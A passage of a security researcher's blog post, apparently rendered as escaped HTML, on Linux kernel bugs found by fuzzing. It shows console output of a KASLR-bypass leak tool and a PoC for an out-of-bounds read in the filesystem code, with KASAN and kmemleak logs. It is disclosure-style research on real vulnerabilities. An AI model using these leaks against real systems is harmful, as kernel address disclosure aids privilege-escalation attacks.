operator\">&lt;</span><span class=\"token number\">00000000</span>d4c47900<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> __x64_sys_mount<span class=\"token operator\">+</span><span class=\"token number\">0xba</span><span class=\"token operator\">/</span><span class=\"token number\">0x150</span> fs<span class=\"token operator\">/</span>namespace<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">3075</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">0000000052f</span><span class=\"token number\">04</span>bfc<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> do_syscall_64<span class=\"token operator\">+</span><span class=\"token number\">0x165</span><span class=\"token operator\">/</span><span class=\"token number\">0x670</span> arch<span class=\"token operator\">/</span>x86<span class=\"token operator\">/</span>entry<span class=\"token operator\">/</span>common<span class=\"token punctuation\">.</span>c<span class=\"token operator\">:</span><span class=\"token number\">290</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">000000005</span>d846763<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> entry_SYSCALL_64_after_hwframe<span class=\"token operator\">+</span><span class=\"token number\">0x49</span><span class=\"token operator\">/</span><span class=\"token number\">0xbe</span>\n    <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token number\">000000005</span>c780d9d<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token number\">0xffffffffffffffff</span></code></pre></div>\n<h3 id=\"mm-stuff\" style=\"position:relative;\"><a href=\"#mm-stuff\" aria-label=\"mm stuff permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>mm stuff</h3>\n<p>These bugs are what I found on LK v4.16.x. Here's my <a href=\"http://kozistr.tech/2018/03/23/LK-kaslr_bypass.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">post</a>.</p>\n<p>I dunno whether it was patched :). But, as I remembered, it's not a perfectly reliable bug, and there's kinda restriction. So, I'll skip this bug :).</p>\n<p><code class=\"language-text\">Console Demo</code></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp$ uname <span class=\"token operator\">-</span>a\nLinux zer0day <span class=\"token number\">4.16</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc5<span class=\"token operator\">+</span> #<span class=\"token number\">19</span> SMP Sun Mar <span class=\"token number\">18</span> <span class=\"token number\">20</span><span class=\"token operator\">:</span><span class=\"token number\">44</span><span class=\"token operator\">:</span><span class=\"token number\">40</span> KST <span class=\"token number\">2018</span> x86_64 GNU<span class=\"token operator\">/</span>Linux\nzero@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>leak\nzero@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>leak <span class=\"token number\">1</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> Found Kernel Base Address<span class=\"token operator\">!</span>\n<span class=\"token punctuation\">[</span><span class=\"token operator\">+</span><span class=\"token punctuation\">]</span> kbase <span class=\"token operator\">:</span> <span class=\"token number\">0xffffffff89e00000</span>\nzero@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp$ su\nroot@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp# cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep _text <span class=\"token operator\">|</span> head <span class=\"token operator\">-</span>n <span class=\"token number\">1</span>\nffffffff89e00000 T _text\nroot@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp#</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">zero@zer0day:/tmp$ ./leak\n...\nzero@zer0day:/tmp$ ./leak 1\n[+] Found Kernel Base Address!\n[+] kbase : 0xffffffffb2600000\nzero@zer0day:/tmp$ ls\nleak  leak.c\nzero@zer0day:/tmp$ su\nroot@zer0day:/tmp# cat /proc/kallsyms | grep _text | head -n 1\nffffffffb2600000 T _text\nroot@zer0day:/tmp# uname -a\nLinux zer0day 4.16.0-rc7+ #22 SMP Thu Mar 29 16:46:52 KST 2018 x86_64 GNU/Linux</code></pre></div>\n<p>Anyway, successfully got kernel base address :)</p>\n<h2 id=\"0-day-bug\" style=\"position:relative;\"><a href=\"#0-day-bug\" aria-label=\"0 day bug permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>0-day bug</h2>\n<p>In this chapter, I gonna show information disclosure which can lead to <em>KASLR bypass</em>. This feature is used on many Linux distributions, So, maybe it is reliable on many Linux systems :| (i didn't test all of them, yet)</p>\n<h3 id=\"bugs\" style=\"position:relative;\"><a href=\"#bugs\" aria-label=\"bugs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bugs</h3>\n<p>This bug is <code class=\"language-text\">slab-out-of-bounds</code> <em>Read</em>. By using this, kernel-land addresses (heap) can be leaked. Found on LK ~v.4.18.x-rc5.</p>\n<p>Hint for the vulnerability is <code class=\"language-text\">fs</code>. There're no any validations for specific variable and it leads to <em>OOB</em>.</p>\n<h3 id=\"syslog\" style=\"position:relative;\"><a href=\"#syslog\" aria-label=\"syslog permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>syslog</h3>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">[</span>  <span class=\"token number\">421.466496</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.467034</span><span class=\"token punctuation\">]</span> BUG<span class=\"token operator\">:</span> KASAN<span class=\"token operator\">:</span> slab<span class=\"token operator\">-</span>out<span class=\"token operator\">-</span>of<span class=\"token operator\">-</span>bounds in xxx\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.467350</span><span class=\"token punctuation\">]</span> Read of size <span class=\"token number\">48059</span> at addr ffff88006bb9002d by task poc<span class=\"token operator\">/</span><span class=\"token number\">2823</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.467704</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.467795</span><span class=\"token punctuation\">]</span> CPU<span class=\"token operator\">:</span> <span class=\"token number\">1</span> PID<span class=\"token operator\">:</span> <span class=\"token number\">2823</span> Comm<span class=\"token operator\">:</span> poc Not tainted <span class=\"token number\">4.18</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc5<span class=\"token operator\">+</span> #<span class=\"token number\">23</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.468128</span><span class=\"token punctuation\">]</span> Hardware name<span class=\"token operator\">:</span> QEMU Standard <span class=\"token function\">PC</span> <span class=\"token punctuation\">(</span>i440FX <span class=\"token operator\">+</span> PIIX<span class=\"token punctuation\">,</span> <span class=\"token number\">1996</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> BIOS Ubuntu<span class=\"token operator\">-</span><span class=\"token number\">1.8</span><span class=\"token number\">.2</span><span class=\"token operator\">-</span><span class=\"token number\">1u</span>buntu1 <span class=\"token number\">04</span><span class=\"token operator\">/</span><span class=\"token number\">01</span><span class=\"token operator\">/</span><span class=\"token number\">2014</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.468626</span><span class=\"token punctuation\">]</span> Call Trace<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.484432</span><span class=\"token punctuation\">]</span> RIP<span class=\"token operator\">:</span> <span class=\"token number\">0033</span><span class=\"token operator\">:</span><span class=\"token number\">0x7fc9130f2afa</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.484623</span><span class=\"token punctuation\">]</span> Code<span class=\"token operator\">:</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> \n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.485702</span><span class=\"token punctuation\">]</span> RSP<span class=\"token operator\">:</span> <span class=\"token number\">002</span>b<span class=\"token operator\">:</span><span class=\"token number\">0000000000700</span>c18 EFLAGS<span class=\"token operator\">:</span> <span class=\"token number\">00000206</span> ORIG_RAX<span class=\"token operator\">:</span> <span class=\"token number\">00000000000000</span>a5\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.486100</span><span class=\"token punctuation\">]</span> RAX<span class=\"token operator\">:</span> ffffffffffffffda RBX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> RCX<span class=\"token operator\">:</span> <span class=\"token number\">00007f</span>c9130f2afa\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.486469</span><span class=\"token punctuation\">]</span> RDX<span class=\"token operator\">:</span> <span class=\"token number\">0000000000700</span>d30 RSI<span class=\"token operator\">:</span> <span class=\"token number\">0000000000700</span>d40 RDI<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.486838</span><span class=\"token punctuation\">]</span> RBP<span class=\"token operator\">:</span> <span class=\"token number\">0000000000700</span>d90 R08<span class=\"token operator\">:</span> <span class=\"token number\">0000000000700</span>c30 R09<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000001</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.487205</span><span class=\"token punctuation\">]</span> R10<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> R11<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000206</span> R12<span class=\"token operator\">:</span> <span class=\"token number\">00000000004005</span>d0\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.487571</span><span class=\"token punctuation\">]</span> R13<span class=\"token operator\">:</span> <span class=\"token number\">00007ff</span>cd7f02910 R14<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> R15<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.487945</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.488030</span><span class=\"token punctuation\">]</span> The buggy address belongs to the page<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.488284</span><span class=\"token punctuation\">]</span> page<span class=\"token operator\">:</span>ffffea0001aee400 count<span class=\"token operator\">:</span><span class=\"token number\">1</span> mapcount<span class=\"token operator\">:</span><span class=\"token number\">0</span> mapping<span class=\"token operator\">:</span><span class=\"token number\">0000000000000000</span> index<span class=\"token operator\">:</span><span class=\"token number\">0x0</span> compound_mapcount<span class=\"token operator\">:</span> <span class=\"token number\">0</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.488789</span><span class=\"token punctuation\">]</span> flags<span class=\"token operator\">:</span> <span class=\"token number\">0x100000000008000</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.489013</span><span class=\"token punctuation\">]</span> raw<span class=\"token operator\">:</span> <span class=\"token number\">0100000000008000</span> dead000000000100 dead000000000200 <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.489411</span><span class=\"token punctuation\">]</span> raw<span class=\"token operator\">:</span> <span class=\"token number\">0000000000000000</span> <span class=\"token number\">0000000000000000</span> <span class=\"token number\">00000001ffff</span>ffff <span class=\"token number\">0000000000000000</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.489810</span><span class=\"token punctuation\">]</span> page dumped because<span class=\"token operator\">:</span> kasan<span class=\"token operator\">:</span> bad access detected\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.490099</span><span class=\"token punctuation\">]</span> \n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.490183</span><span class=\"token punctuation\">]</span> Memory state around the buggy address<span class=\"token operator\">:</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.490436</span><span class=\"token punctuation\">]</span>  ffff88006bb91f00<span class=\"token operator\">:</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.490815</span><span class=\"token punctuation\">]</span>  ffff88006bb91f80<span class=\"token operator\">:</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.491188</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span>ffff88006bb92000<span class=\"token operator\">:</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> fe fe fe fe fe fe fe fe fe fe fe fe\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.491558</span><span class=\"token punctuation\">]</span>                                <span class=\"token operator\">^</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.491786</span><span class=\"token punctuation\">]</span>  ffff88006bb92080<span class=\"token operator\">:</span> fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.492163</span><span class=\"token punctuation\">]</span>  ffff88006bb92100<span class=\"token operator\">:</span> fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe fe\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">421.492530</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">1316.744978</span><span class=\"token punctuation\">]</span> kmemleak<span class=\"token operator\">:</span> <span class=\"token number\">314</span> new suspected memory <span class=\"token function\">leaks</span> <span class=\"token punctuation\">(</span>see <span class=\"token operator\">/</span>sys<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>debug<span class=\"token operator\">/</span>kmemleak<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">1939.198134</span><span class=\"token punctuation\">]</span> kmemleak<span class=\"token operator\">:</span> <span class=\"token number\">12219</span> new suspected memory <span class=\"token function\">leaks</span> <span class=\"token punctuation\">(</span>see <span class=\"token operator\">/</span>sys<span class=\"token operator\">/</span>kernel<span class=\"token operator\">/</span>debug<span class=\"token operator\">/</span>kmemleak<span class=\"token punctuation\">)</span></code></pre></div>\n<p><code class=\"language-text\">file /sys/kernel/debug/kmemleak</code></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">unreferenced object <span class=\"token number\">0xffff88005bfec000</span> <span class=\"token punctuation\">(</span>size <span class=\"token number\">14280</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n  comm <span class=\"token string\">\"poc\"</span><span class=\"token punctuation\">,</span> pid <span class=\"token number\">3256</span><span class=\"token punctuation\">,</span> jiffies <span class=\"token number\">4295094805</span> <span class=\"token punctuation\">(</span>age <span class=\"token number\">1984.122</span>s<span class=\"token punctuation\">)</span>\n  hex <span class=\"token function\">dump</span> <span class=\"token punctuation\">(</span>first <span class=\"token number\">32</span> bytes<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">88</span> <span class=\"token number\">51</span> <span class=\"token number\">10</span> <span class=\"token number\">6</span>b <span class=\"token number\">00</span> <span class=\"token number\">88</span> ff ff  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>Q<span class=\"token punctuation\">.</span>k<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token number\">00</span> <span class=\"token number\">80</span> <span class=\"token number\">2</span>c <span class=\"token number\">6</span>a <span class=\"token number\">00</span> <span class=\"token number\">88</span> ff ff <span class=\"token number\">00</span> c0 <span class=\"token number\">2</span>c <span class=\"token number\">6</span>a <span class=\"token number\">00</span> <span class=\"token number\">88</span> ff ff  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\nunreferenced object <span class=\"token number\">0xffff88006b105188</span> <span class=\"token punctuation\">(</span>size <span class=\"token number\">96</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n  comm <span class=\"token string\">\"poc\"</span><span class=\"token punctuation\">,</span> pid <span class=\"token number\">3256</span><span class=\"token punctuation\">,</span> jiffies <span class=\"token number\">4295094805</span> <span class=\"token punctuation\">(</span>age <span class=\"token number\">1984.122</span>s<span class=\"token punctuation\">)</span>\n  hex <span class=\"token function\">dump</span> <span class=\"token punctuation\">(</span>first <span class=\"token number\">32</span> bytes<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> <span class=\"token number\">00</span> ad <span class=\"token number\">4</span>e ad de ff ff ff ff <span class=\"token number\">6</span>b <span class=\"token number\">6</span>b <span class=\"token number\">6</span>b <span class=\"token number\">6</span>b  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>N<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>kkkk\n    ff ff ff ff ff ff ff ff a0 <span class=\"token number\">14</span> <span class=\"token number\">7</span>a <span class=\"token number\">98</span> ff ff ff ff  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>z<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></code></pre></div>\n<h3 id=\"demo\" style=\"position:relative;\"><a href=\"#demo\" aria-label=\"demo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Demo</h3>\n<p>I roughly make a PoC code, So, currently, it should be run by <code class=\"language-text\">root</code> privilege. But, maybe it can also be run by <code class=\"language-text\">normal user</code> privilege after a few fixes.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">root@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp# uname <span class=\"token operator\">-</span>a\nLinux zer0day <span class=\"token number\">4.18</span><span class=\"token number\">.0</span><span class=\"token operator\">-</span>rc5<span class=\"token operator\">+</span> #<span class=\"token number\">23</span> SMP Tue Jul <span class=\"token number\">17</span> <span class=\"token number\">22</span><span class=\"token operator\">:</span><span class=\"token number\">48</span><span class=\"token operator\">:</span><span class=\"token number\">05</span> KST <span class=\"token number\">2018</span> x86_64 GNU<span class=\"token operator\">/</span>Linux\nroot@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp# ls <span class=\"token operator\">-</span>al\ntotal <span class=\"token number\">24</span>\ndrwxrwxrwt  <span class=\"token number\">2</span> root root <span class=\"token number\">4096</span> Jul <span class=\"token number\">20</span> <span class=\"token number\">09</span><span class=\"token operator\">:</span><span class=\"token number\">51</span> <span class=\"token punctuation\">.</span>\ndrwxr<span class=\"token operator\">-</span>xr<span class=\"token operator\">-</span>x <span class=\"token number\">24</span> root root <span class=\"token number\">4096</span> Jul <span class=\"token number\">17</span> <span class=\"token number\">14</span><span class=\"token operator\">:</span><span class=\"token number\">19</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token operator\">-</span>rwxr<span class=\"token operator\">-</span>xr<span class=\"token operator\">-</span>x  <span class=\"token number\">1</span> zero zero <span class=\"token number\">8307</span> Jul <span class=\"token number\">20</span> <span class=\"token number\">09</span><span class=\"token operator\">:</span><span class=\"token number\">18</span> poc\n<span class=\"token operator\">-</span>rw<span class=\"token operator\">-</span>r<span class=\"token operator\">--</span>r<span class=\"token operator\">--</span>  <span class=\"token number\">1</span> zero zero <span class=\"token number\">1222</span> Jul <span class=\"token number\">20</span> <span class=\"token number\">09</span><span class=\"token operator\">:</span><span class=\"token number\">18</span> poc<span class=\"token punctuation\">.</span>c\nroot@zer0day<span class=\"token operator\">:</span><span class=\"token operator\">/</span>tmp# <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>poc\n<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">[</span>lots of kaddr leaks<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">]</span></code></pre></div>\n<p><del>Hmm... not cool stuff :(</del></p>\n<h2 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>There're more bugs that I and fuzzer found like UAFs, OOBs, etc... But, some of them can't be reproducible :( or can run under some conditions...</p>\n<p>Anyway, the latest LK version is <em>v4.18.0-rc5</em> (7/20/2018).\nAnd i think the Linux kernel still has a lot of security issues and they're just exposed to unprivileged users. It means many interfaces need to be tested and some features should be restricted by default.</p>","excerpt":"TL;DR Last time, I posted about 1-day vulnerability CVE-2017-5123, waitid() arbitrary R/W with null-deref on LK v4.13.x/~v4.14.0-rc4. It ju","tableOfContents":"<ul>\n<li>\n<p><a 